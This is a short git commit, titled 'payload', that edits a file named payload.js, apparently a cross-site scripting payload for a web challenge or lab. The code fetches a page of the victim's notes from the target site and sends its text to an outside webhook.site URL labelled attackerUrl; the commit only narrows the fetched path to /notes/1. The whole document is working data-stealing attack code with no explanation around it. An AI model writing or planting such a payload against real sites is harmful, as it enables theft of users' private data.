d49d1434147c87ed83d0f7a73cf78588b56c049a
Axl <bryannicholas7@gmail.com>
2025-06-26 21:11:27 +0700

    payload

--- payload.js
+++ payload.js
@@ -1,6 +1,6 @@
 const attackerUrl = 'https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6'
 async function exploit() {
-	const res = await fetch(`/notes`)
+	const res = await fetch(`/notes/1`)
 	const text = await res.text();
 	fetch(`${attackerUrl}?q=${encodeURIComponent(text)}`);
 }
